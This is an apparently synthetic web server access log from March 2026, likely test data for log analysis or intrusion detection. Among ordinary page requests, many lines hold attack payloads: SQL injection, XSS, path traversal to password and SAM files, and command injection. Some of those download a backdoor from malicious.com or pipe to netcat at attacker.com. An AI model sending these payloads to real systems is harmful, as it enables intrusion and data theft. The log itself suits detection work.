203.0.113.77 - - [27/Mar/2026:11:46:24 +0000] "GET /api/exec?cmd=; cat /etc/passwd HTTP/1.1" 500 512 "http://google.com" "python-requests/2.25.1"
198.51.100.50 - - [22/Mar/2026:21:43:24 +0000] "GET /services HTTP/1.1" 500 256 "http://localhost:3000" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.1 - - [23/Mar/2026:11:55:24 +0000] "GET /images/logo.png HTTP/1.1" 200 33580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.103 - - [23/Mar/2026:02:31:24 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 512 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
172.16.0.1 - - [21/Mar/2026:20:11:24 +0000] "GET /products/page1 HTTP/1.1" 500 256 "http://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.45 - - [21/Mar/2026:01:25:24 +0000] "GET ....\\....\\windows\\system32\\config\\sam HTTP/1.1" 403 256 "http://localhost:3000" "python-requests/2.25.1"
203.0.113.77 - - [27/Mar/2026:03:51:24 +0000] "GET ../wp-config.php HTTP/1.1" 403 256 "-" "curl/7.68.0"
192.0.2.200 - - [24/Mar/2026:13:29:24 +0000] "GET /index.html HTTP/1.1" 404 7756 "http://facebook.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.0.2.100 - - [24/Mar/2026:22:33:24 +0000] "GET /about HTTP/1.1" 301 8442 "http://google.com" "curl/7.68.0"
192.0.2.200 - - [27/Mar/2026:11:18:24 +0000] "GET /about HTTP/1.1" 301 44351 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.5 - - [26/Mar/2026:01:05:24 +0000] "GET /static/css/style.css HTTP/1.1" 301 30489 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.77 - - [23/Mar/2026:10:23:24 +0000] "GET /api/users?id=' OR 1=1 -- HTTP/1.1" 200 1024 "http://localhost:3000" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
10.0.0.50 - - [25/Mar/2026:14:22:24 +0000] "GET /api/exec?cmd=; cat /etc/passwd HTTP/1.1" 500 512 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
198.51.100.5 - - [23/Mar/2026:00:11:24 +0000] "GET /pricing HTTP/1.1" 200 27279 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.45 - - [22/Mar/2026:23:52:24 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 512 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.1 - - [22/Mar/2026:18:53:24 +0000] "GET /api/v1/users HTTP/1.1" 301 10018 "http://localhost:3000" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.50 - - [22/Mar/2026:16:02:24 +0000] "GET /index.html HTTP/1.1" 502 256 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.77 - - [26/Mar/2026:17:51:24 +0000] "GET /api/users?id=1' UNION SELECT NULL,NULL,NULL -- HTTP/1.1" 200 1024 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
198.51.100.5 - - [25/Mar/2026:18:33:24 +0000] "GET /static/css/style.css HTTP/1.1" 200 25329 "http://localhost:3000" "python-requests/2.25.1"
198.51.100.50 - - [26/Mar/2026:23:25:24 +0000] "GET /static/css/style.css HTTP/1.1" 301 38195 "http://bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.103 - - [23/Mar/2026:02:33:24 +0000] "GET /api/exec?cmd=`whoami` HTTP/1.1" 500 512 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.1 - - [22/Mar/2026:14:25:24 +0000] "GET /products/page1 HTTP/1.1" 404 34047 "http://localhost:3000" "curl/7.68.0"
198.51.100.50 - - [24/Mar/2026:18:45:24 +0000] "GET /index.html HTTP/1.1" 404 43268 "http://bing.com" "curl/7.68.0"
193.0.113.99 - - [26/Mar/2026:06:58:24 +0000] "POST /admin/login HTTP/1.1" 401 512 "http://localhost:3000" "python-requests/2.25.1"
10.0.0.50 - - [21/Mar/2026:02:29:24 +0000] "POST /api/profile?name=javascript:alert('XSS') HTTP/1.1" 200 2048 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.25 - - [22/Mar/2026:06:53:24 +0000] "GET /services HTTP/1.1" 404 23507 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.5 - - [21/Mar/2026:19:05:24 +0000] "GET /about HTTP/1.1" 301 40365 "-" "python-requests/2.25.1"
10.0.0.50 - - [24/Mar/2026:21:50:24 +0000] "GET ....//....//....//etc/shadow HTTP/1.1" 403 256 "http://localhost:3000" "python-requests/2.25.1"
203.0.113.25 - - [20/Mar/2026:18:26:24 +0000] "GET /pricing HTTP/1.1" 404 47320 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.0.2.200 - - [26/Mar/2026:17:25:24 +0000] "GET /about HTTP/1.1" 404 22389 "http://facebook.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.5 - - [25/Mar/2026:13:56:24 +0000] "GET /blog/article-1 HTTP/1.1" 404 47807 "http://localhost:3000" "python-requests/2.25.1"
192.0.2.100 - - [24/Mar/2026:21:17:24 +0000] "GET /pricing HTTP/1.1" 404 44314 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.200 - - [23/Mar/2026:10:02:24 +0000] "GET /images/logo.png HTTP/1.1" 200 11516 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
193.0.113.99 - - [21/Mar/2026:04:35:24 +0000] "GET /api/users?id=' OR 1=1 -- HTTP/1.1" 200 1024 "http://facebook.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.77 - - [23/Mar/2026:15:57:24 +0000] "GET ../wp-config.php HTTP/1.1" 403 256 "http://facebook.com" "python-requests/2.25.1"
193.0.113.99 - - [23/Mar/2026:11:37:24 +0000] "GET /api/users?id=1' UNION SELECT NULL,NULL,NULL -- HTTP/1.1" 200 1024 "-" "curl/7.68.0"
193.0.113.99 - - [22/Mar/2026:01:12:24 +0000] "POST /api/profile?name=<img src=x onerror=alert('XSS')> HTTP/1.1" 200 2048 "http://localhost:3000" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.77 - - [22/Mar/2026:03:21:24 +0000] "GET /api/exec?cmd=`whoami` HTTP/1.1" 500 512 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.25 - - [21/Mar/2026:00:58:24 +0000] "GET /services HTTP/1.1" 200 33802 "http://bing.com" "curl/7.68.0"
203.0.113.25 - - [23/Mar/2026:07:38:24 +0000] "GET /about HTTP/1.1" 200 28106 "http://facebook.com" "python-requests/2.25.1"
203.0.113.25 - - [22/Mar/2026:06:06:24 +0000] "GET /images/logo.png HTTP/1.1" 200 46638 "http://localhost:3000" "python-requests/2.25.1"
203.0.113.25 - - [27/Mar/2026:15:48:24 +0000] "GET /blog/article-1 HTTP/1.1" 301 16852 "http://bing.com" "python-requests/2.25.1"
192.0.2.200 - - [26/Mar/2026:11:10:24 +0000] "GET /invalid/path HTTP/1.1" 500 256 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.100 - - [23/Mar/2026:02:33:24 +0000] "GET /images/logo.png HTTP/1.1" 301 43513 "http://google.com" "curl/7.68.0"
192.0.2.100 - - [24/Mar/2026:22:36:24 +0000] "GET /pricing HTTP/1.1" 301 11152 "-" "python-requests/2.25.1"
10.0.0.50 - - [22/Mar/2026:22:14:24 +0000] "GET /api/users?id=' OR 1=1 -- HTTP/1.1" 200 1024 "http://google.com" "curl/7.68.0"
203.0.113.25 - - [21/Mar/2026:08:43:24 +0000] "GET /pricing HTTP/1.1" 404 48545 "http://localhost:3000" "curl/7.68.0"
203.0.113.45 - - [25/Mar/2026:23:04:24 +0000] "GET /contact HTTP/1.1" 502 256 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.0.2.200 - - [23/Mar/2026:09:30:24 +0000] "GET /products/page1 HTTP/1.1" 404 4322 "http://facebook.com" "python-requests/2.25.1"
192.0.2.200 - - [25/Mar/2026:12:48:24 +0000] "GET /images/logo.png HTTP/1.1" 200 25847 "http://localhost:3000" "curl/7.68.0"
198.51.100.5 - - [21/Mar/2026:10:55:24 +0000] "GET /products/page1 HTTP/1.1" 404 33255 "http://facebook.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.77 - - [20/Mar/2026:17:53:24 +0000] "GET /api/users?id=1' UNION SELECT NULL,NULL,NULL -- HTTP/1.1" 200 1024 "http://facebook.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
10.0.0.50 - - [24/Mar/2026:23:50:24 +0000] "POST /api/profile?name=<svg onload=alert('XSS')> HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.103 - - [26/Mar/2026:18:32:24 +0000] "GET /contact HTTP/1.1" 503 256 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.45 - - [21/Mar/2026:04:09:24 +0000] "GET /pricing HTTP/1.1" 404 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.77 - - [20/Mar/2026:18:16:24 +0000] "POST /api/profile?name=<svg onload=alert('XSS')> HTTP/1.1" 200 2048 "http://facebook.com" "curl/7.68.0"
172.16.0.1 - - [25/Mar/2026:20:51:24 +0000] "GET /api/exec?cmd=; cat /etc/passwd HTTP/1.1" 500 512 "http://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.25 - - [20/Mar/2026:17:45:24 +0000] "GET /pricing HTTP/1.1" 200 45312 "http://google.com" "curl/7.68.0"
172.16.0.1 - - [22/Mar/2026:06:38:24 +0000] "GET /invalid/path HTTP/1.1" 404 256 "-" "curl/7.68.0"
203.0.113.1 - - [23/Mar/2026:17:00:24 +0000] "GET /api/v1/users HTTP/1.1" 301 25385 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.200 - - [24/Mar/2026:17:33:24 +0000] "GET /pricing HTTP/1.1" 200 47525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.1 - - [24/Mar/2026:12:19:24 +0000] "GET /images/logo.png HTTP/1.1" 200 33769 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.0.2.200 - - [20/Mar/2026:17:51:24 +0000] "GET /pricing HTTP/1.1" 404 33534 "-" "curl/7.68.0"
192.0.2.100 - - [25/Mar/2026:00:20:24 +0000] "GET /services HTTP/1.1" 404 36493 "-" "python-requests/2.25.1"
203.0.113.1 - - [26/Mar/2026:21:03:24 +0000] "GET /services HTTP/1.1" 200 41908 "http://bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.103 - - [21/Mar/2026:01:00:24 +0000] "POST /admin/login HTTP/1.1" 401 512 "http://bing.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
193.0.113.99 - - [23/Mar/2026:18:10:24 +0000] "GET /api/users?id=' OR '1'='1 HTTP/1.1" 200 1024 "http://bing.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.0.50 - - [22/Mar/2026:14:43:24 +0000] "GET /api/users?id=' OR 1=1 -- HTTP/1.1" 200 1024 "http://bing.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.100 - - [25/Mar/2026:22:53:24 +0000] "GET /blog/article-1 HTTP/1.1" 404 20231 "http://facebook.com" "curl/7.68.0"
10.0.0.50 - - [20/Mar/2026:21:41:24 +0000] "GET /api/exec?cmd=$(wget http://malicious.com/backdoor.sh) HTTP/1.1" 500 512 "http://facebook.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.0.2.200 - - [24/Mar/2026:06:34:24 +0000] "GET /about HTTP/1.1" 404 26373 "http://localhost:3000" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.5 - - [26/Mar/2026:19:02:24 +0000] "GET /services HTTP/1.1" 404 25481 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.0.2.200 - - [23/Mar/2026:20:42:24 +0000] "GET /static/css/style.css HTTP/1.1" 301 46951 "http://facebook.com" "curl/7.68.0"
10.0.0.50 - - [27/Mar/2026:12:00:24 +0000] "GET ....\\....\\windows\\system32\\config\\sam HTTP/1.1" 403 256 "http://localhost:3000" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.77 - - [23/Mar/2026:12:59:24 +0000] "GET /invalid/path HTTP/1.1" 500 256 "http://localhost:3000" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.0.2.200 - - [23/Mar/2026:02:48:24 +0000] "GET /services HTTP/1.1" 404 13214 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.25 - - [21/Mar/2026:00:37:24 +0000] "GET /services HTTP/1.1" 301 25816 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.45 - - [22/Mar/2026:11:15:24 +0000] "POST /api/v1/auth/login HTTP/1.1" 401 512 "http://bing.com" "curl/7.68.0"
198.51.100.5 - - [24/Mar/2026:05:02:24 +0000] "GET /pricing HTTP/1.1" 404 36603 "http://localhost:3000" "python-requests/2.25.1"
192.0.2.200 - - [25/Mar/2026:08:17:24 +0000] "GET /services HTTP/1.1" 404 5934 "http://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
193.0.113.99 - - [25/Mar/2026:20:59:24 +0000] "POST /api/profile?name=<iframe src=javascript:alert('XSS')> HTTP/1.1" 200 2048 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.100 - - [21/Mar/2026:18:10:24 +0000] "GET /products/page1 HTTP/1.1" 404 14837 "-" "python-requests/2.25.1"
203.0.113.77 - - [27/Mar/2026:03:07:24 +0000] "POST /api/profile?name=<script>alert('XSS')</script> HTTP/1.1" 200 2048 "http://bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.1 - - [26/Mar/2026:16:11:24 +0000] "GET /api/users?id='; DROP TABLE users; -- HTTP/1.1" 200 1024 "http://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.1 - - [24/Mar/2026:22:47:24 +0000] "GET /api/users?id=' OR '1'='1 HTTP/1.1" 200 1024 "http://facebook.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
172.16.0.1 - - [23/Mar/2026:18:31:24 +0000] "GET ../../../etc/passwd HTTP/1.1" 403 256 "-" "python-requests/2.25.1"
198.51.100.50 - - [25/Mar/2026:09:19:24 +0000] "GET /products/page1 HTTP/1.1" 200 25781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
10.0.0.50 - - [25/Mar/2026:19:23:24 +0000] "GET ....//....//....//etc/shadow HTTP/1.1" 403 256 "http://localhost:3000" "curl/7.68.0"
198.51.100.5 - - [23/Mar/2026:23:57:24 +0000] "GET /api/v1/users HTTP/1.1" 404 46078 "http://facebook.com" "python-requests/2.25.1"
203.0.113.45 - - [24/Mar/2026:16:55:24 +0000] "POST /api/profile?name=<img src=x onerror=alert('XSS')> HTTP/1.1" 200 2048 "http://facebook.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.1 - - [24/Mar/2026:18:24:24 +0000] "GET /products/page1 HTTP/1.1" 301 40412 "-" "curl/7.68.0"
198.51.100.5 - - [26/Mar/2026:10:57:24 +0000] "GET /api/v1/users HTTP/1.1" 200 4634 "http://google.com" "curl/7.68.0"
172.16.0.1 - - [26/Mar/2026:02:23:24 +0000] "GET /api/exec?cmd=| nc attacker.com 4444 HTTP/1.1" 500 512 "http://google.com" "curl/7.68.0"
192.0.2.100 - - [26/Mar/2026:15:26:24 +0000] "GET /contact HTTP/1.1" 404 1743 "http://facebook.com" "python-requests/2.25.1"
192.0.2.200 - - [27/Mar/2026:07:59:24 +0000] "GET /invalid/path HTTP/1.1" 503 256 "http://google.com" "python-requests/2.25.1"
203.0.113.1 - - [23/Mar/2026:11:53:24 +0000] "GET /blog/article-1 HTTP/1.1" 500 256 "http://bing.com" "curl/7.68.0"
198.51.100.50 - - [24/Mar/2026:14:12:24 +0000] "GET /images/logo.png HTTP/1.1" 404 1780 "http://bing.com" "python-requests/2.25.1"
203.0.113.1 - - [22/Mar/2026:03:42:24 +0000] "GET /pricing HTTP/1.1" 200 49478 "http://localhost:3000" "curl/7.68.0"
192.168.1.103 - - [21/Mar/2026:10:08:24 +0000] "POST /admin/login HTTP/1.1" 401 512 "http://facebook.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.103 - - [23/Mar/2026:21:44:24 +0000] "POST /user/login HTTP/1.1" 401 512 "http://localhost:3000" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.45 - - [26/Mar/2026:13:26:24 +0000] "POST /api/profile?name=<svg onload=alert('XSS')> HTTP/1.1" 200 2048 "http://facebook.com" "python-requests/2.25.1"
203.0.113.25 - - [26/Mar/2026:23:02:24 +0000] "GET /index.html HTTP/1.1" 200 41441 "-" "curl/7.68.0"
172.16.0.1 - - [26/Mar/2026:11:51:24 +0000] "POST /administrator/index.php HTTP/1.1" 401 512 "-" "curl/7.68.0"
192.168.1.103 - - [25/Mar/2026:08:47:24 +0000] "POST /api/profile?name=<script>alert('XSS')</script> HTTP/1.1" 200 2048 "http://google.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.77 - - [27/Mar/2026:14:30:24 +0000] "POST /user/login HTTP/1.1" 401 512 "http://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.103 - - [27/Mar/2026:03:36:24 +0000] "POST /admin/login HTTP/1.1" 401 512 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.1 - - [23/Mar/2026:03:58:24 +0000] "GET /services HTTP/1.1" 200 7066 "http://localhost:3000" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.1 - - [22/Mar/2026:19:19:24 +0000] "POST /user/login HTTP/1.1" 401 512 "http://localhost:3000" "python-requests/2.25.1"
192.168.1.103 - - [22/Mar/2026:19:33:24 +0000] "POST /user/login HTTP/1.1" 401 512 "http://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.50 - - [23/Mar/2026:00:39:24 +0000] "GET /index.html HTTP/1.1" 404 256 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
10.0.0.50 - - [23/Mar/2026:04:05:24 +0000] "POST /api/profile?name=<iframe src=javascript:alert('XSS')> HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.45 - - [24/Mar/2026:18:25:24 +0000] "GET /api/users?id='; DROP TABLE users; -- HTTP/1.1" 200 1024 "http://facebook.com" "python-requests/2.25.1"
193.0.113.99 - - [24/Mar/2026:18:01:24 +0000] "GET /api/users?id=admin' OR '1'='1' /* HTTP/1.1" 200 1024 "http://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.200 - - [27/Mar/2026:12:59:24 +0000] "GET /about HTTP/1.1" 200 8788 "http://google.com" "curl/7.68.0"
192.0.2.200 - - [21/Mar/2026:13:47:24 +0000] "GET /products/page1 HTTP/1.1" 301 884 "http://bing.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.1 - - [26/Mar/2026:07:36:24 +0000] "GET /blog/article-1 HTTP/1.1" 404 43731 "http://facebook.com" "curl/7.68.0"
192.168.1.103 - - [22/Mar/2026:06:54:24 +0000] "POST /admin/login HTTP/1.1" 401 512 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.50 - - [22/Mar/2026:16:24:24 +0000] "GET /index.html HTTP/1.1" 200 19899 "http://localhost:3000" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.0.2.200 - - [25/Mar/2026:04:05:24 +0000] "GET /blog/article-1 HTTP/1.1" 200 48131 "http://bing.com" "curl/7.68.0"
203.0.113.25 - - [20/Mar/2026:21:26:24 +0000] "GET /pricing HTTP/1.1" 200 40862 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
203.0.113.1 - - [26/Mar/2026:19:04:24 +0000] "GET /images/logo.png HTTP/1.1" 301 37109 "http://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
198.51.100.50 - - [24/Mar/2026:13:59:24 +0000] "GET /blog/article-1 HTTP/1.1" 404 35345 "http://google.com" "curl/7.68.0"
172.16.0.1 - - [26/Mar/2026:19:51:24 +0000] "POST /user/login HTTP/1.1" 401 512 "http://google.com" "python-requests/2.25.1"
172.16.0.1 - - [23/Mar/2026:11:23:24 +0000] "GET /contact HTTP/1.1" 502 256 "http://localhost:3000" "python-requests/2.25.1"
192.168.1.103 - - [26/Mar/2026:00:45:24 +0000] "GET /api/users?id=' OR '1'='1 HTTP/1.1" 200 1024 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.25 - - [26/Mar/2026:12:01:24 +0000] "GET /products/page1 HTTP/1.1" 404 19089 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
198.51.100.50 - - [24/Mar/2026:23:04:24 +0000] "GET /pricing HTTP/1.1" 200 31212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.168.1.103 - - [23/Mar/2026:13:30:24 +0000] "GET /api/users?id=admin' OR '1'='1' /* HTTP/1.1" 200 1024 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.0.50 - - [20/Mar/2026:20:47:24 +0000] "GET /api/exec?cmd=`whoami` HTTP/1.1" 500 512 "http://facebook.com" "python-requests/2.25.1"
203.0.113.25 - - [25/Mar/2026:07:24:24 +0000] "GET /index.html HTTP/1.1" 200 35518 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
172.16.0.1 - - [26/Mar/2026:13:33:24 +0000] "POST /user/login HTTP/1.1" 401 512 "http://bing.com" "python-requests/2.25.1"
192.0.2.200 - - [22/Mar/2026:04:05:24 +0000] "GET /about HTTP/1.1" 200 33927 "http://google.com" "curl/7.68.0"
192.168.1.103 - - [27/Mar/2026:11:39:24 +0000] "POST /api/profile?name=<iframe src=javascript:alert('XSS')> HTTP/1.1" 200 2048 "http://localhost:3000" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.77 - - [24/Mar/2026:08:55:24 +0000] "POST /api/profile?name=<svg onload=alert('XSS')> HTTP/1.1" 200 2048 "http://google.com" "python-requests/2.25.1"
198.51.100.50 - - [23/Mar/2026:10:33:24 +0000] "GET /pricing HTTP/1.1" 404 40907 "http://bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.0.2.100 - - [26/Mar/2026:05:01:24 +0000] "GET /pricing HTTP/1.1" 301 19604 "http://bing.com" "python-requests/2.25.1"
192.0.2.200 - - [25/Mar/2026:21:09:24 +0000] "GET /products/page1 HTTP/1.1" 200 46192 "http://bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.1 - - [27/Mar/2026:13:29:24 +0000] "GET /services HTTP/1.1" 404 7205 "http://facebook.com" "curl/7.68.0"
172.16.0.1 - - [24/Mar/2026:01:32:24 +0000] "GET /api/users?id=1' UNION SELECT NULL,NULL,NULL -- HTTP/1.1" 200 1024 "http://bing.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.5 - - [24/Mar/2026:18:47:24 +0000] "GET /static/css/style.css HTTP/1.1" 200 29407 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.0.2.100 - - [21/Mar/2026:05:44:24 +0000] "GET /static/css/style.css HTTP/1.1" 301 44712 "http://google.com" "python-requests/2.25.1"
203.0.113.25 - - [22/Mar/2026:08:18:24 +0000] "GET /static/css/style.css HTTP/1.1" 301 24235 "http://localhost:3000" "curl/7.68.0"
193.0.113.99 - - [25/Mar/2026:17:51:24 +0000] "GET /api/exec?cmd=; cat /etc/passwd HTTP/1.1" 500 512 "http://localhost:3000" "curl/7.68.0"
203.0.113.77 - - [24/Mar/2026:14:03:24 +0000] "GET /api/exec?cmd=$(wget http://malicious.com/backdoor.sh) HTTP/1.1" 500 512 "http://localhost:3000" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
198.51.100.50 - - [25/Mar/2026:15:28:24 +0000] "GET /contact HTTP/1.1" 301 10909 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
198.51.100.50 - - [27/Mar/2026:15:20:24 +0000] "GET /images/logo.png HTTP/1.1" 200 44639 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
192.0.2.100 - - [22/Mar/2026:10:48:24 +0000] "GET /products/page1 HTTP/1.1" 500 256 "http://google.com" "curl/7.68.0"
203.0.113.45 - - [26/Mar/2026:18:29:24 +0000] "GET ....\\....\\windows\\system32\\config\\sam HTTP/1.1" 403 256 "http://localhost:3000" "curl/7.68.0"
203.0.113.77 - - [22/Mar/2026:20:31:24 +0000] "GET ../../windows/win.ini HTTP/1.1" 403 256 "http://localhost:3000" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
203.0.113.25 - - [26/Mar/2026:06:49:24 +0000] "GET /products/page1 HTTP/1.1" 200 16253 "http://facebook.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
